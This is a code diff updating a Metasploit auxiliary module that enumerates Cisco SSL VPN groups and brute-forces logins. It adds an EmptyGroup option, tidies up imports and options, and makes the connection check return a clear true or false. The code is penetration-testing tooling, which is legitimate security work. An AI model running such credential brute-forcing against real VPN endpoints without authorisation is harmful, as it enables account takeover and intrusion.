@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'rex/proto/http'
-require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
@@ -37,7 +35,11 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(443),
         OptString.new('GROUP', [false, "A specific VPN group to use", ''])
-      ], self.class)
+      ])
+    register_advanced_options(
+      [
+        OptBool.new('EmptyGroup', [true, "Use an empty group with authentication requests", false])
+      ])
   end
 
   def run_host(ip)
@@ -54,7 +56,9 @@ class MetasploitModule < Msf::Auxiliary
     vprint_good("Application appears to be Cisco SSL VPN. Module will continue.")
 
     groups = Set.new
-    if datastore['GROUP'].empty?
+    if datastore['EmptyGroup'] == true
+      groups << ""
+    elsif datastore['GROUP'].empty?
       vprint_status("Attempt to Enumerate VPN Groups...")
       groups = enumerate_vpn_groups
 
@@ -69,7 +73,6 @@ class MetasploitModule < Msf::Auxiliary
     else
       groups << datastore['GROUP']
     end
-    groups << ""
 
     vprint_status("Starting login brute force...")
     groups.each do |group|
@@ -83,14 +86,17 @@ class MetasploitModule < Msf::Auxiliary
   def check_conn?
     begin
       res = send_request_cgi('uri' => '/', 'method' => 'GET')
-      vprint_good("Server is responsive...")
+      if res
+        vprint_good("Server is responsive...")
+        return true
+      end
     rescue ::Rex::ConnectionRefused,
            ::Rex::HostUnreachable,
            ::Rex::ConnectionTimeout,
            ::Rex::ConnectionError,
            ::Errno::EPIPE
-      return
     end
+    false
   end
 
   def enumerate_vpn_groups
